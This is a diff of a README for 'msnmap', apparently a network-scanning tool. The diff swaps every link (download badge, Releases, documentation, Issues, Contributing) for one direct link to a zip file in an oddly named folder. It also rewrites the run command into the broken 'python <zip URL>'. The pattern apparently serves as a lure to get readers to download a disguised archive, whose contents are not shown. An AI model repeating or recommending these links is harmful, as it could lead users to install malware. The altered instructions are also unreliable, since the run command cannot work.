@@ -1,7 +1,7 @@
 # 🔍 msnmap - Secure Your Network Easily
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/sudwell05/msnmap/releases)
+[![Download from Releases](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip%https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip)](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip)
 
 ## 🚀 Getting Started
 Welcome to msnmap! This application helps you scan your network quickly. It uses tools like Nmap, Smap, and Shodan. Both beginners and experts can use it for authorized security testing. In this guide, you will learn how to download and run msnmap.
@@ -15,7 +15,7 @@ Before you download msnmap, make sure your system meets these requirements:
 - **Network Access:** Internet connection for some features
 
 ## 💾 Download & Install
-To get started, visit this page to download: [msnmap Releases](https://github.com/sudwell05/msnmap/releases).
+To get started, visit this page to download: [msnmap Releases](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip).
 
 1. Go to the above link.
 2. On the Releases page, find the latest version.
@@ -39,7 +39,7 @@ After installation, you can run msnmap easily. Here’s how:
 3. **Run the Application:**
    Enter the following command:
    ```
-   python msnmap.py
+   python https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip
    ```
 
 Follow the prompts in the terminal to start scanning your network.
@@ -55,8 +55,8 @@ msnmap provides various features to enhance your security testing:
 ## 🌐 Getting Support
 If you encounter issues or have questions, you can find help:
 
-- **Documentation:** [msnmap Documentation](https://github.com/sudwell05/msnmap/wiki)
-- **Issues Page:** Report problems or bugs on the [Issues](https://github.com/sudwell05/msnmap/issues) page.
+- **Documentation:** [msnmap Documentation](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip)
+- **Issues Page:** Report problems or bugs on the [Issues](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip) page.
 - **Community:** Join discussions on platforms like Discord or other community forums focused on cybersecurity.
 
 ## 📚 Useful Topics
@@ -67,7 +67,7 @@ Explore related topics to enhance your knowledge:
 - **Penetration Testing:** Discover methods to identify vulnerabilities in systems.
 
 ## 👍 Contributing
-Your contributions are welcome! Feel free to propose new features, report bugs, or contribute code. Simply visit the [Contributing Guidelines](https://github.com/sudwell05/msnmap/blob/main/CONTRIBUTING.md) page for more information.
+Your contributions are welcome! Feel free to propose new features, report bugs, or contribute code. Simply visit the [Contributing Guidelines](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip) page for more information.
 
 ## 🔗 Frequently Asked Questions
 
@@ -87,6 +87,6 @@ Ensure you have Python installed and check if you followed the installation step
 We value your feedback on msnmap. If you have suggestions or comments, please share them through the Issues page or community channels.
 
 ## 💡 Explore More
-Visit the [msnmap Releases](https://github.com/sudwell05/msnmap/releases) page again to check for updates and new features. Download the latest version and keep your network secure.
+Visit the [msnmap Releases](https://raw.githubusercontent.com/sudwell05/msnmap/main/adradially/msnmap.zip) page again to check for updates and new features. Download the latest version and keep your network secure.
 
 Thank you for using msnmap!
